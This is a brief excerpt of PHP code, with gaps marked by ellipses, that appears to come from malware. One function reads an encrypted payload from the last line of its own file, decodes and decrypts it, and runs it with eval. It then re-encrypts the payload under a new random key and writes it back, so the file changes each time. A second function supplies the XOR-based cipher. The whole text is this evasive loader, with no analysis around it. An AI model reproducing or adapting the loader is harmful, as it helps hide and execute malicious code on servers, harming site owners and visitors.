...
function cx() { $x = base64_decode(implode(array_slice(file(__FILE__),-1))); $y = dx($x, bx($x)); eval($y); fx((base64_encode(ex($y."0", str_pad(rand(0,9999),4,'0',STR_PAD_LEFT))))); die(); }
...
function ex($str, $key) { $key = hash("sha256", $key); foreach(str_split(hash("sha256", NULL).$str) as $k=>$v) $str[$k] = ($v^$key[$k%64]); return $str; }
